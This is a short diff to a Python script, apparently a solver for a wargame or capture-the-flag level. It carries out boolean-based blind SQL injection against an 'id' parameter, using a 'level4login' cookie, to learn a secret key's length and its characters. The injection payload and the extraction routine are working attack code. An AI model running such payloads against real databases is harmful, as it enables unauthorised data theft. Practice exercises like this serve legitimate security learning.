@@ -5,6 +5,14 @@ import tiger_cookies
 from connect import my_request as req
 
 
+def check_func(*args) -> bool:
+    '''
+    check string in response of request
+    args[0]: response
+    '''
+    return '1 rows' in args[0]
+
+
 def main():
     '''
     Blind SQL Injection.
@@ -23,11 +31,11 @@ def main():
     cook = dict(level4login=cooks[level])
 
     # Find len of key
-    len_of_key = tg.find_key_len(url,
-                                 f"1 and if((select length({finds}) from {base_name}) %s",
-                                 'id', '1 rows', cook)
+    payload = f"1 and if((select length({finds}) from {base_name})>%s, 1, 0)"
+    param = dict(id=payload)
+    len_of_key = tg.find_key_len(url, param, check_func, cook)
 
-    print(len_of_key)
+    print('key length: ', len_of_key)
 
     # Find key
     key = tg.find_binary(url,
